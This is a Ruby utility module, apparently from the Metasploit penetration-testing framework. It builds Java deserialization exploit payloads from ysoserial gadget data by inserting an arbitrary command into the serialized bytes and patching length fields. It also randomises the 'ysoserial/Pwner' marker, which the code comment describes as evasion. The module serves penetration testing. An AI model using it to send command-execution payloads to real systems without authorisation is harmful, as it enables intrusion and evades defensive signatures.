module Msf
module Util

require 'json'

# TODO:
# Support ysoserial alongside ysoserial-modified payloads (including cmd, bash, powershell, none)

class JavaDeserialization

  PAYLOAD_FILENAME = "ysoserial_payloads.json"

  def self.ysoserial_payload(payload_name, command=nil)
    # Open the JSON file and parse it
    begin
      path = File.join(Msf::Config.data_directory, PAYLOAD_FILENAME)
      json = JSON.parse(File.read(path))
    rescue Errno::ENOENT, JSON::ParserError
      raise RuntimeError, "Unable to load JSON data from 'data/#{PAYLOAD_FILENAME}'"
    end

    raise ArgumentError, "#{payload_name} payload not found in ysoserial payloads" if json[payload_name].nil?

    # Extract the specified payload (status, lengthOffset, bufferOffset, bytes)
    payload = json[payload_name]

    # Based on the status, we'll raise an exception, return a static payload, or
    # generate a dynamic payload with modifications at the specified offsets
    case payload['status']
    when 'unsupported'
      # This exception will occur most commonly with complex payloads that require more than a string
      raise ArgumentError, 'ysoserial payload is unsupported'
    when 'static'
      # TODO: Consider removing 'static' functionality, since ysoserial doesn't currently use it
      return Rex::Text.decode_base64(payload['bytes'])
    when 'dynamic'
      raise ArgumentError, 'missing command parameter' if command.nil?

      bytes = Rex::Text.decode_base64(payload['bytes'])

      # Insert buffer
      buffer_offset  = payload['bufferOffset'].first   #TODO: Do we ever need to support multiple buffers?
      bytes[buffer_offset - 1] += command

      # Overwrite length (multiple times, if necessary)
      length_offsets = payload['lengthOffset']
      length_offsets.each do |length_offset|
        # Extract length as a 16-bit unsigned int, then add the length of the command string
        length  = bytes[(length_offset-1)..length_offset].unpack('n').first
        length += command.length.ord
        length  = [length].pack("n")
        bytes[(length_offset-1)..length_offset] = length
      end

      # Replace "ysoserial\/Pwner" timestamp string with randomness for evasion
      bytes.gsub!(/ysoserial\/Pwner00000000000000/, Rex::Text.rand_text_alphanumeric(29))

      return bytes
    else 
      raise RuntimeError, 'Malformed JSON file'
    end
  end
end
end
end

